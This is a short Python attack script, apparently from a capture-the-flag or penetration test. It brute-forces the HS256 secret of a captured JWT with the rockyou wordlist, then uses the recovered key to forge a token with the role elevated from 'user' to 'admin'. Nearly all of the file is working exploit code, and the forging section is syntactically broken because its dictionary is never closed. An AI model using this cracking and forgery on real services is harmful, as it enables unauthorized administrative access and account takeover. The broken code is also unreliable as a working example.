#!/usr/bin/env python3

## For cracker
import jwt

jwt_token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoidXNlciIsImV4cCI6MTcyODgzMDk1NH0.zJ7_3Gizf-hVNtV--u7nYE3WB_R9yg0SMTMIzy-wirU'
wordlist_path = '/opt/rockyou.txt'  

with open(wordlist_path, 'r') as file:
    for line in file:
        secret_key = line.strip()
        try:
            decoded = jwt.decode(jwt_token, secret_key, algorithms=['HS256'], options={"verify_exp": False})
            print(f"Secret key found: {secret_key} -> Decoded: {decoded}")
            break
        except jwt.InvalidSignatureError:
            continue

# For custom generator

import jwt
import datetime

secret_key = 'zxcvbnm'

new_payload = {
    'role': 'admin',
    'exp': datetime.datetime.utcnow() + datetime.timedelta(days=7) 

new_jwt_token = jwt.encode(new_payload, secret_key, algorithm='HS256')

print(f"New JWT token with admin role: {new_jwt_token}")
